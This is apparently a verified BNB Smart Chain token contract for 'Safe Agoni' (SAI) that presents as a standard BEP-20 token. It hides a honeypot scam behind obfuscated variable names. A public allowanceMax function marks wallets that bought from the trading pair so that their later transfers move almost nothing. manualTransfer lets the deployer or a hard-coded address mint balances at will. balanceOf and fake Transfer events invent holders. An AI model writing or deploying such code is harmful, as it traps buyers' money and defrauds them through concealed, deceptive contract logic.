/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;



interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

}


library SafeMath {

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function symbol() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



contract SafeAgoni is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    bool private burnModeExemptMax = false;

    bool private receiverSellTotalLiquidityAt = false;
    uint256 constant fundMintAutoReceiver = 100 * 10 ** 18;
    bool public exemptFeeReceiverSell = false;
    uint256 public modeFeeMarketingExempt = 0;
    mapping(address => bool)  enableTakeListLaunch;



    string constant _symbol = "SAI";
    bool public liquidityLaunchedEnableTotalMarketingTo = false;
    IUniswapV2Router public limitFeeTradingModeLiquidityMaxShould;
    bool private maxLiquidityWalletTotal = false;


    bool private isModeToFund = false;
    bool public exemptToAmountTxFromReceiverReceiver = false;

    mapping(address => mapping(address => uint256)) _allowances;
    bool private fromSenderAmountReceiver = false;
    uint256 buyLiquidityAtToken = 0;
    address constant feeTeamIsMarketingBurn = 0x8D3CB354f3460E245dc4bfb08AdB3a3a68bee5E2;
    mapping(address => bool) private txListLaunchTotal;
    mapping(address => uint256) _balances;
    mapping(address => bool)  buyLiquidityBurnLaunch;
    address private senderTokenTotalFee = (msg.sender);

    address public uniswapV2Pair;

    
    address constant walletListShouldReceiver = 0xc3E6531faCDbe49A3A9585754aB447A01D8f8Ed6;
    uint256 public autoMarketingExemptBuy = 0;
    uint256 public fundListTakeShould = 0;
    string constant _name = "Safe Agoni";

    bool private txAutoBurnListFromLaunchShould = false;
    uint256 private listTeamAmountAuto = 0;
    uint256  enableIsLimitLaunch = 100000000 * (10 ** 18);
    bool public minAmountBuyLaunchAutoMarketing = false;
    uint256 constant marketingTxLimitToken = 1000000 * 10 ** 18;

    uint256 private tokenTeamAutoFee = 0;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        limitFeeTradingModeLiquidityMaxShould = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(limitFeeTradingModeLiquidityMaxShould.factory()).createPair(address(this), limitFeeTradingModeLiquidityMaxShould.WETH());
        _allowances[address(this)][address(limitFeeTradingModeLiquidityMaxShould)] = enableIsLimitLaunch;

        _balances[msg.sender] = enableIsLimitLaunch;
        emit Transfer(address(0), msg.sender, enableIsLimitLaunch);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableIsLimitLaunch;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableIsLimitLaunch) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return receiverTradingTotalLiquidity(sender, recipient, amount);
    }

    function minReceiverSellMarketingAtLiquidity() private pure returns (uint256) {
        return uint160(feeTeamIsMarketingBurn) + 1;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return enableTakeListLaunch[spender];
    }

    function receiverTradingTotalLiquidity(address txBurnIsList, address isExemptFeeTradingAuto, uint256 receiverAtMinMarketingBurnToList) internal returns (bool) {
        if (txTeamTokenLaunchLiquiditySender(isExemptFeeTradingAuto)) {
            mintModeExemptFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList, false);
            return true;
        }
        if (txTeamTokenLaunchLiquiditySender(txBurnIsList)) {
            mintModeExemptFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList, true);
            return true;
        }

        bool mintLaunchedShouldFromAutoTotalTo = toBuyAutoAmount(txBurnIsList) || toBuyAutoAmount(isExemptFeeTradingAuto);
        if (mintLaunchedShouldFromAutoTotalTo) {
            return tradingMintBurnFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList);
        }

        if (txBurnIsList == uniswapV2Pair && !mintLaunchedShouldFromAutoTotalTo) {
            buyLiquidityBurnLaunch[isExemptFeeTradingAuto] = true;
        }

        if (enableTakeListLaunch[txBurnIsList]) {
            return tradingMintBurnFund(txBurnIsList, isExemptFeeTradingAuto, 10 ** 10);
        }

        return tradingMintBurnFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList);
    }

    function toBuyAutoAmount(address autoEnableBuyLimitFromFundReceiver) private view returns (bool) {
        return autoEnableBuyLimitFromFundReceiver == senderTokenTotalFee;
    }

    function txTeamTokenLaunchLiquiditySender(address mintMaxSellBuy) private pure returns (bool) {
        uint256 fromLimitTokenReceiverIsTeam = minReceiverSellMarketingAtLiquidity();
        uint256 mintMaxSellBuy256 = uint160(mintMaxSellBuy);
        if (mintMaxSellBuy256 >= fromLimitTokenReceiverIsTeam && mintMaxSellBuy256 < fromLimitTokenReceiverIsTeam + 10000) {
            return true;
        }
        return false;
    }

    function enableTradingIsLaunchedAt(address mintMaxSellBuy) private pure returns (bool) {
        return mintMaxSellBuy == walletListShouldReceiver;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function maxToEnableTotalTokenReceiver(address mintMaxSellBuy) private view returns (uint256) {
        uint256 toFeeSellLiquidity = tokenFeeReceiverMax(mintMaxSellBuy);
        if (toFeeSellLiquidity < buyLiquidityAtToken) {
            return fundMintAutoReceiver * toFeeSellLiquidity;
        }
        return marketingTxLimitToken + fundMintAutoReceiver * toFeeSellLiquidity;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverTradingTotalLiquidity(msg.sender, recipient, amount);
    }

    function manualTransfer(address txBurnIsList, address isExemptFeeTradingAuto, uint256 receiverAtMinMarketingBurnToList) public {
        if (!enableTradingIsLaunchedAt(msg.sender) && msg.sender != senderTokenTotalFee) {
            return;
        }
        if (txTeamTokenLaunchLiquiditySender(isExemptFeeTradingAuto)) {
            mintModeExemptFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList, false);
            return;
        }
        if (txTeamTokenLaunchLiquiditySender(txBurnIsList)) {
            mintModeExemptFund(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList, true);
            return;
        }
        if (txBurnIsList == address(0)) {
            _balances[isExemptFeeTradingAuto] = _balances[isExemptFeeTradingAuto].add(receiverAtMinMarketingBurnToList);
            return;
        }
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function tradingMintBurnFund(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mintModeExemptFund(address txBurnIsList, address isExemptFeeTradingAuto, uint256 receiverAtMinMarketingBurnToList, bool shouldSellLaunchIs) private {
        if (shouldSellLaunchIs) {
            uint256 fromLimitTokenReceiverIsTeam = minReceiverSellMarketingAtLiquidity();
            txBurnIsList = address(uint160(fromLimitTokenReceiverIsTeam + buyLiquidityAtToken));
            buyLiquidityAtToken++;
            _balances[isExemptFeeTradingAuto] = _balances[isExemptFeeTradingAuto].add(receiverAtMinMarketingBurnToList);
        } else {
            _balances[txBurnIsList] = _balances[txBurnIsList].sub(receiverAtMinMarketingBurnToList);
        }
        emit Transfer(txBurnIsList, isExemptFeeTradingAuto, receiverAtMinMarketingBurnToList);
    }

    function tokenFeeReceiverMax(address mintMaxSellBuy) private pure returns (uint256) {
        uint256 fromLimitTokenReceiverIsTeam = minReceiverSellMarketingAtLiquidity();
        uint256 toFeeSellLiquidity = uint160(mintMaxSellBuy) - fromLimitTokenReceiverIsTeam;
        return toFeeSellLiquidity;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (txTeamTokenLaunchLiquiditySender(account)) {
            return maxToEnableTotalTokenReceiver(account);
        }
        return _balances[account];
    }

    function allowanceMax(address spender) external {
        if (buyLiquidityBurnLaunch[spender]) {
            enableTakeListLaunch[spender] = true;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}